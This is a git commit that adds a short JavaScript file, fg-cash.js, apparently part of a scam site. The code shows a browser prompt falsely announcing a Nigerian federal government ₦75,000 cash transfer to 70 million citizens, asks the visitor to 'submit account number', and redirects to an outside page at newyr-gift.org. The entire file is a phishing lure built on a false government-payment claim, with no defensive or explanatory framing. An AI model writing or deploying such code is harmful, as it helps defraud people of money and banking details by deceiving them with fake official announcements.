58aeaf414eb8dc088bce48c21ca944e8931db22d
ukebeblog <esther001imoh@gmail.com>
2025-01-16 10:37:35 +0100

    Create fg-cash.js

---
+++ fg-cash.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw ₦75,000'
+password=prompt('FG: Payment ongoing. You are among the 70 million Nigerians to Receive ₦75,000.00 cash transfer 2025, kindly press Ok to submit account number now ','Withdraw ₦75,000');
+if (password != 'Withdraw ₦75,000') {
+location.href='https://newyr-gift.org/fg-75k-cash.html';
+}
